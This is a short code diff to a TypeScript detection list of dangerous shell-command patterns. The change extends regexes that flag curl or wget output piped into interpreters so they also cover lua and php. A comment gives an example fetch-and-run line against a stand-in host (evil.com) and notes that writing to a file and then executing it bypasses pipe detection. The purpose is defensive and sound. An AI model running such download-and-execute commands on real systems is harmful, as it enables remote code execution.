@@ -115,8 +115,8 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // False-positive analysis: >(basename …), >(wc -l), >(grep …) are safe — none match the interpreter list.
   { pattern: />\(\s*(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php)\b/, category: "process-substitution-execution" },
   // Remote code execution — piping downloaded content into script interpreters
-  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun)\b/, category: "remote-code-execution" },
-  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun)\b/, category: "remote-code-execution" },
+  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php)\b/, category: "remote-code-execution" },
+  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php)\b/, category: "remote-code-execution" },
   // Remote code execution — two-step write-then-execute: curl/wget redirects to a file,
   // then a shell/interpreter executes it via && or ; (bypasses pipe-detection guards above)
   // e.g. curl evil.com/x > /tmp/payload && bash /tmp/payload
